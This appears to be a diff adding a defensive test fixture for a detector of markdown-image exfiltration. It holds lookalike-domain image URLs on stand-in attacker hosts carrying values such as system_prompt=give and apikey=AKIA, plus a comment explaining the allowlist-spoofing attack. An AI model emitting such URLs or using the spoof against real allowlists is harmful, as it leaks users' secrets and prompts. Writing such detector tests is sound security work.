@@ -1,0 +1,31 @@
+# v1.19.0 trusted-allowlist subdomain-spoof attack.
+#
+# Attack model: an attacker registers a domain that ends with a trusted-host
+# TOKEN (e.g. `jsdelivr.net.attacker.com` or `stripe.com.evil.com`) hoping the
+# allowlist check uses a substring/endsWith on the full hostname WITHOUT the
+# leading dot. Our isTrustedAllowlistHost uses `h === t || h.endsWith("." + t)`
+# so these MUST fall through to the unknown-host tier and fire as
+# danger (strong key) or warning (weak key).
+
+# Strong key on subdomain-spoof — MUST fire as danger:
+![evil1](https://jsdelivr.net.evil.com/payload?prompt=leak)
+
+# Strong key on TLD-spoof — MUST fire as danger:
+![evil2](https://api.stripe.com.attacker.org/v1/charges?prompt=token)
+
+# Strong key on auth0 lookalike — MUST fire as danger:
+![evil3](https://login.auth0.com.evil.net/p?system_prompt=give)
+
+# Strong key on intercom-shaped subdomain — MUST fire as danger:
+![evil4](https://js.intercomcdn.com.evil.io/?apikey=AKIA)
+
+# Weak key on cloudfront-lookalike — MUST fire as warning (unknown tier):
+![evil5](https://d123.cloudfront.net.evil.host/img.png?session=victim)
+
+# Reference image with subdomain spoof:
+![spoofed][spoof-ref]
+
+[spoof-ref]: https://github.com.attacker.io/repo/raw/main/x.png?prompt=leak
+
+# HTML <img> with subdomain spoof:
+<img src="https://stats.g.doubleclick.net.evil.org/p?prompt=track">
